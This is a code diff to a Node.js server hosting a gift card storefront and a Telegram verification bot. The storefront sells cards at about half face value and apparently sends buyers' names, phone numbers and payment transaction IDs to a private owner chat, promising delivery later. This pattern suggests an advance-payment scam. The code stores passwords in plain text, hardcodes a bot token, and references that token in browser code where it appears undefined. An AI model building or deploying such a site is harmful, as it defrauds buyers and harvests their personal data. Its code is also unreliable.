@@ -1,7 +1,7 @@
-import http from 'fs';
-import fs from 'fs';
+import http from 'http';
 
 const BOT_TOKEN = "8674826347:AAHLN8nGRz7pVN1Vh9AdjnAbCoQ5R5n8dCk";
+const OWNER_ID = "8558052873";
 const PORT = process.env.PORT || 3000;
 
 const HTML = `<!DOCTYPE html>
@@ -101,7 +101,6 @@ const HTML = `<!DOCTYPE html>
     
     let currentUser = null;
     
-    // Save to localStorage
     function saveUser(user) {
         let users = JSON.parse(localStorage.getItem('users') || '{}');
         users[user.phone] = user;
@@ -123,7 +122,6 @@ const HTML = `<!DOCTYPE html>
         }, 3000);
     }
     
-    // Login Screen
     function showLogin() {
         document.getElementById('app').innerHTML = \`
             <div class="container">
@@ -137,7 +135,6 @@ const HTML = `<!DOCTYPE html>
         \`;
     }
     
-    // Register Screen
     function showRegister() {
         document.getElementById('app').innerHTML = \`
             <div class="container">
@@ -152,7 +149,6 @@ const HTML = `<!DOCTYPE html>
         \`;
     }
     
-    // Bot Verification Screen
     function showBotVerification() {
         document.getElementById('app').innerHTML = \`
             <div class="container">
@@ -169,7 +165,6 @@ const HTML = `<!DOCTYPE html>
         \`;
     }
     
-    // Shop Screen
     function showShop() {
         const products = [
             { name: "Amazon ₹50", value: 50, price: 25 },
@@ -187,12 +182,13 @@ const HTML = `<!DOCTYPE html>
         ];
         
         let productsHtml = '';
-        products.forEach(p => {
-            productsHtml += \`<div class="product" onclick="order('\${p.name}', \${p.value}, \${p.price})">
-                <span class="product-name">\${p.name}</span>
-                <span class="product-price">Pay ₹\${p.price}</span>
-            </div>\`;
-        });
+        for(let i = 0; i < products.length; i++) {
+            let p = products[i];
+            productsHtml += '<div class="product" onclick="order(\'' + p.name + '\', ' + p.value + ', ' + p.price + ')">' +
+                '<span class="product-name">' + p.name + '</span>' +
+                '<span class="product-price">Pay ₹' + p.price + '</span>' +
+            '</div>';
+        }
         
         document.getElementById('app').innerHTML = \`
             <div class="container">
@@ -204,7 +200,6 @@ const HTML = `<!DOCTYPE html>
         \`;
     }
     
-    // Login function
     function login() {
         let phone = document.getElementById('phone').value;
         let password = document.getElementById('password').value;
@@ -229,7 +224,6 @@ const HTML = `<!DOCTYPE html>
         }
     }
     
-    // Register function
     function register() {
         let name = document.getElementById('name').value;
         let phone = document.getElementById('phone').value;
@@ -246,13 +240,12 @@ const HTML = `<!DOCTYPE html>
             return;
         }
         
-        let newUser = { name, phone, password, telegramId: null };
+        let newUser = { name: name, phone: phone, password: password, telegramId: null };
         saveUser(newUser);
         showMessage('Registration successful! Please login.', 'success');
-        setTimeout(() => showLogin(), 2000);
+        setTimeout(function() { showLogin(); }, 2000);
     }
     
-    // Verify code from bot
     function verifyCode() {
         let code = document.getElementById('code').value;
         if(!code) {
@@ -260,51 +253,45 @@ const HTML = `<!DOCTYPE html>
             return;
         }
         
-        // Save telegram ID
         currentUser.telegramId = code;
         let users = getUsers();
         users[currentUser.phone].telegramId = code;
         localStorage.setItem('users', JSON.stringify(users));
         
-        // Notify owner
         fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: "8558052873",
-                text: \`✅ New user verified!\nName: \${currentUser.name}\nPhone: \${currentUser.phone}\nTelegram ID: \${code}\`
+                chat_id: "${OWNER_ID}",
+                text: '✅ New user verified!\\nName: ' + currentUser.name + '\\nPhone: ' + currentUser.phone + '\\nTelegram ID: ' + code
             })
-        }).catch(e => console.log);
+        }).catch(function(e) { console.log(e); });
         
         showMessage('Verified successfully!', 'success');
-        setTimeout(() => showShop(), 1000);
+        setTimeout(function() { showShop(); }, 1000);
     }
     
-    // Order
     function order(name, value, price) {
         let utr = prompt('Enter UTR / Transaction ID after payment');
         if(!utr) return;
         
-        // Send to owner
         fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: "8558052873",
-                text: \`🆕 NEW ORDER!\nUser: \${currentUser.name}\nPhone: \${currentUser.phone}\nProduct: \${name}\nValue: ₹\${value}\nPaid: ₹\${price}\nUTR: \${utr}\`
+                chat_id: "${OWNER_ID}",
+                text: '🆕 NEW ORDER!\\nUser: ' + currentUser.name + '\\nPhone: ' + currentUser.phone + '\\nProduct: ' + name + '\\nValue: ₹' + value + '\\nPaid: ₹' + price + '\\nUTR: ' + utr
             })
-        }).catch(e => console.log);
+        }).catch(function(e) { console.log(e); });
         
         showMessage('Order placed! You will receive gift card within 24 hours.', 'success');
     }
     
-    // Logout
     function logout() {
         currentUser = null;
         showLogin();
     }
     
-    // Start
     showLogin();
 </script>
 </body>
@@ -315,42 +302,50 @@ const server = http.createServer((req, res) => {
     res.end(HTML);
 });
 
-// Bot polling
 let offset = 0;
+
 async function tg(method, data) {
     try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+        const res = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/' + method, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         });
         return await res.json();
-    } catch(e) { return {}; }
+    } catch(e) {
+        return {};
+    }
 }
 
 async function poll() {
     while (true) {
-        const data = await tg('getUpdates', { offset, timeout: 30 });
-        if (data.ok && data.result) {
-            for (const update of data.result) {
-                offset = update.update_id + 1;
-                if (update.message && update.message.text === '/start') {
-                    const chatId = update.message.chat.id;
-                    const code = `USER_${chatId}_${Date.now()}`;
-                    await tg('sendMessage', { 
-                        chat_id: chatId, 
-                        text: `✅ YOUR CODE: ${code}\n\nCopy this code and paste on the website to verify your account.` 
-                    });
-                    console.log(`Code sent to ${chatId}`);
+        try {
+            const data = await tg('getUpdates', { offset: offset, timeout: 30 });
+            if (data.ok && data.result) {
+                for (let i = 0; i < data.result.length; i++) {
+                    const update = data.result[i];
+                    offset = update.update_id + 1;
+                    if (update.message && update.message.text === '/start') {
+                        const chatId = update.message.chat.id;
+                        const code = 'USER_' + chatId + '_' + Date.now();
+                        await tg('sendMessage', {
+                            chat_id: chatId,
+                            text: '✅ YOUR CODE: ' + code + '\n\nCopy this code and paste on the website to verify your account.'
+                        });
+                        console.log('Code sent to ' + chatId);
+                    }
                 }
             }
+        } catch(e) {
+            console.log('Bot error:', e.message);
         }
-        await new Promise(r => setTimeout(r, 2000));
+        await new Promise(function(r) { setTimeout(r, 2000); });
     }
 }
 
-server.listen(PORT, () => {
-    console.log(`✅ Server on http://localhost:${PORT}`);
-    console.log(`✅ Bot running! Send /start to @Giftclerkbot`);
+server.listen(PORT, function() {
+    console.log('✅ Server running on port ' + PORT);
+    console.log('✅ Bot running! Send /start to @Giftclerkbot');
 });
+
 poll();
